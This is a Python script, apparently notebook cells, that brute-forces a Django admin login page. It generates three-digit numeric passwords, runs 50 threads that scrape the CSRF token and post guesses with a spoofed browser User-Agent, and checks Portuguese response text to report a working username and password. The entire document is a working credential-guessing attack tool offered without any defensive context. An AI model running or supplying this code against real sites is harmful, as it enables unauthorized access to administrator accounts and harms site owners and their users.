```python
import sys
import requests
from queue import Queue
from bs4 import BeautifulSoup
from concurrent import futures
from itertools import permutations
```

```python
WORKS = 50
words = Queue()
dicionario = [str(x) for x in range(10)]
for x in permutations(dicionario, 3): words.put(x)
total = words.qsize()
```

```python
class BFLoginPanel:
    def __init__(self, domain: str, username: str):
        self.domain = domain
        self.username = username
        self.cookies = {}
        self.session = requests.Session()
        self.url = domain + "/admin/login/?next=/admin"
        self.protocol_mode = "Local File Mode"

        self.login_page = self.session.get(self.url)
        with futures.ThreadPoolExecutor(max_workers=WORKS) as pool:
            works = []
            for _ in range(WORKS):
                works.append(pool.submit(self.brute_force, _))
            print("[[main]] &gt;&gt; Processo finalizado")

    def brute_force(self, th):
        while not words.empty():
            headers = {
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
                'Referer': self.domain + '/admin/login/?next=/admin'
            }
            password = ''.join(words.get())
            for key, value in self.session.cookies.items():
                self.cookies[key] = value
            self.soup = BeautifulSoup(self.login_page.text, 'html.parser')
            self.csrf = self.soup.find(
                'input', {'name': 'csrfmiddlewaretoken'})['value']

            url = self.domain + "/admin/login/?next=/admin"
            try:
                self.login_page = self.session.post(url, data={'csrfmiddlewaretoken': self.csrf,
                                                               'username': self.username, 'password': password}, cookies=self.cookies, headers=headers)
                sub = total-words.qsize()
                print(f"[!!!] {th} {self.username} {password} {sub}")
                if "CSRF" in self.login_page.text:
                    print("[+] Error:\nCSRF token missing or incorrect.")
                    exit()

                if "Não tem permissão para ver ou editar nada" not in self.login_page.text:
                    continue

                if "alterar senha" in self.login_page.text.lower():
                    print("Found [{th}:{sub}] " + self.username + " - " + password +
                          " - " + str(self.login_page.status_code)+"\n\n")
                    exit()
            except Exception as e:
                print(f"ERROR {th} {e}")
```
